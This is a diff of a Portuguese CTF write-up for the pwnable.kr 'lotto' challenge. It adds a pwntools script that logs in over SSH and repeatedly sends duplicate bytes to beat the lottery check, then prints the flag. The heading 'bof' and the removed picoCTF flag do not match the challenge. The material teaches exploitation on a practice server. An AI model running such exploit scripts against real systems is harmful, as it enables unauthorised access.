@@ -1,6 +1,6 @@
 # bof
 ###### Resolvido por @Menegaldo
-> Este é um CTF sobre [Lógica de funcionamento]
+> Este é um CTF sobre [Operating logic]
 
 ## Sobre o Desafio  
 
@@ -17,7 +17,7 @@ ssh lotto@pwnable.kr -p2222 (pw:guest)
 
 ![image](https://github.com/user-attachments/assets/afd67885-fbed-4b0d-92bf-46c9e5cc03a9)
 
-```c++
+```c
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -114,8 +114,27 @@ int main(int argc, char* argv[]){
         }
         return 0;
 }
-
 ```
 
-> Assim, obtemos a flag `picoCTF{y0u_m4d3_1t_cab35b843fdd6bd889f76566c6279114}`  
+```python
+from pwn import *
+
+sh = ssh('lotto', '128.61.240.205', password='guest', port=2222)
+p = sh.process('./lotto')
+
+for i in range(1000):
+    p.recv()
+    p.sendline(b'1')  # Corrigido para bytes
+    p.recv()
+    p.sendline(b'------')  # Corrigido para bytes
+    _, ans = p.recvlines(2)
+    
+    if b"bad" not in ans:  # Comparação correta
+        print(ans.decode())  # Decodificar para exibir corretamente
+        break
+```
+
+![image](https://github.com/user-attachments/assets/dd178db0-a2e6-4e21-9d64-56ed4e3e150f)
+
+> Assim, obtemos a flag `sorry mom... I FORGOT to check duplicate numbers... :(`
 
